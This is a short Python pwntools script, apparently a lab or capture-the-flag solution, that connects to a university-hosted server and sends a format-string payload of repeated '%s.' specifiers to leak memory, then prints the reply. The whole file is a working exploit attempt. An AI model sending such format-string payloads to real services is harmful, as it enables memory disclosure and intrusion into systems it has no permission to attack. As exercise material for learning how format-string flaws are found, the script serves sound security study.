from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22190

## run a remote process
s = remote(SERVER, PORT, timeout=9999)

s.sendline(b'%s.'*7)
result = s.recvall()
print(result)
